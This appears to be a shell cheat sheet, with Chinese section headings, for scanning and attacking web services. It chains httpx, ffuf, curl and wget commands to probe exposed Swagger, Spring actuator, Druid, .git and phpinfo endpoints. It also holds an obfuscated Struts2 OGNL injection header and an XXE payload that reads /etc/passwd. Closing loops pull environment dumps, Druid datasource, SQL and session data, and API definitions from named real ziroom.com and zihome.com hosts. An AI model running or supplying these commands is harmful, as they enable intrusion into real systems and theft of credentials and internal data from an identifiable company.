










UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"

### 扫描 swagger
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/swagger-resources,/v2/api-docs/,/api/swagger/index.yaml,/swagger/index.yaml' -title -status-code -content-length -content-type -follow-redirects -match-regex "swaggerVersion|\"swagger\":|swagger:"

### 检测 shiro ffuf
ffuf -w urls.txt -u FUZZ -H "User-Agent: ${UA}" -H "Cookie: rememberMe=test;" -mr "rememberMe=" -c 
cat urls.txt|httpx -H "Cookie: rememberMe=asdf;" -tls-probe -csp-probe -retries 1 -path '/api/' -match-string "rememberMe="

### 扫描 struts2
cat urls.txt|httpx -H "User-Agent: ${UA}" -H "Content-Type: %{\u000a\u0009\u0023\u0009con\u0074ext\u0009\u005B\u0027com\u002E\u006Fpensy\u006Dphony\u002Exwo\u0072k2\u002Edispatche\u0072\u002EHttpS\u0065rvletRespons\u0065\u0027\u005D\u0009\u002e\u0009\u0061ddHe\u0061der\u0009\u000a\u0028\u0027Y-RES\u0027\u002C996-1\u0029}\u0009\u002E\u000amultipart/form-data" -tls-probe -csp-probe -match-string "Y-RES"

### 扫描 springboot
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/env,/actuator/env' -title -status-code -content-length -content-type -follow-redirects -match-string "java.runtime.name"
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/actuator/mappings,/mappings' -title -status-code -content-length -content-type -follow-redirects -match-string "dispatcherServlet"

### 扫描 druid
cat urls.txt|httpx -H "User-Agent: ${UA}" -path '/druid/weburi.html' -title -status-code -content-length -content-type -follow-redirects -match-string 'Web URI Stat'

### 扫描 /debug/pprof/ Types of profiles available
cat urls.txt|httpx -H "User-Agent: ${UA}" -path '/debug/pprof/' -title -status-code -content-length -content-type -follow-redirects -match-string 'Types of profiles available'

### 扫描 .git /.git/HEAD ref:
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/.git/HEAD' -title -status-code -content-length -content-type -follow-redirects -match-string 'ref:'

### 扫描 .svg

### 扫描目录遍历 /css/,/static/
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/css/,/static/' -title -status-code -content-length -content-type -follow-redirects -match-string '<title>Index of'

### 扫描 /phpinfo.php
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/phpinfo.php' -title -status-code -content-length -content-type -follow-redirects -match-string '<title>phpinfo()</title>'

### lavarel

### 扫描 package.json
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/package.json' -title -status-code -content-length -content-type -follow-redirects -match-string 'description'

### /phpmyadmin/
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/phpmyadmin/' -title -status-code -content-length -content-type -follow-redirects -match-string 'phpmyadmin'

### examples
cat urls.txt|httpx -H "User-Agent: ${UA}" -paths '/examples/' -title -status-code -content-length -content-type -follow-redirects


### NoSuchBucket
ffuf -w urls.txt -u FUZZ -H "User-Agent: ${UA}" -mr "NoSuchBucket" -c

### XXE
curl -d ' ' -H 'Content-Type: application/xml' 
# <?xml version="1.0" encoding="UTF-8" ?>
# <!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
# <root>
# <search>name</search>
# <value>&xxe;</value>
# </root>






### 下载 spring env
for url in "https://aiqc.ziroom.com/actuator/env" "https://gw.zihome.com/actuator/env" "https://gw.zihome.com/help-connect/actuator/env" "https://smartms.zihome.com/actuator/env" "https://tlink.zihome.com/actuator/env" "https://ztoread.ziroom.com/env" "http://busopp.ziroom.com/actuator/env"
do
	fqdn=$(echo $url |cut -d "/" -f 3)
	echo $url
	wget -U $UA -t 2 -q --no-check-certificate ${url} -O "${fqdn}.env.json"
done


### 下载 druid
for url in "https://azeroth.ziroom.com" "https://inv.service.ziroom.com" "https://hire.ziroom.com" "https://housebook.ziroom.com" "https://prop.ziroom.com" "https://crmapi.ziroom.com" "https://rentorder.ziroom.com/crm" "https://s.ziroom.com/crm" "https://prop.ziroom.com" "https://rentorder.ziroom.com/crm" "http://busopp.ziroom.com" 
do
	prefix=$url
	fqdn=$(echo $url |cut -d "/" -f 3)
	echo $fqdn
	if [ ! -e $fqdn ]; then
		mkdir $fqdn
	fi

	for x in 'druid/datasource.json' 'druid/sql.json' 'druid/basic.json' 'druid/weburi.json' 'druid/websession.json'
	do
		wget -U $UA -t 2 -q --no-check-certificate "${prefix}/$x" -O ${fqdn}/${x#*/}
	done
done

### 下载swagger-resources
# $1 https://smsapi.ziroom.com/swagger-resources
prefix=${1%/*}
for x in $(curl -s -k "$1"|jq '.[].location' |tr -d "\"" |tr "\n" " ")
do
	output=$(echo $x |cut -d "=" -f 2)
	wget -U $UA -t 2 -q --no-check-certificate "${prefix}${x}" -O ${output}.json
done

